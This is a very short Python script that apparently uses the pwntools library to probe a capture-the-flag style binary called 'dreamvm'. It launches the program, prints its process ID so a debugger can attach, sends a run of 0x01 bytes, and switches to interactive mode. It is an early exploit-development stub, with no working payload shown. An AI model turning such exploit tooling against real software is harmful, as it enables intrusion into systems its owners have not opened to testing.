from pwn import *

p = process('dreamvm')

raw_input('debug: ' + str(p.pid))
p.sendline('\x01'*0x9f)
p.interactive()
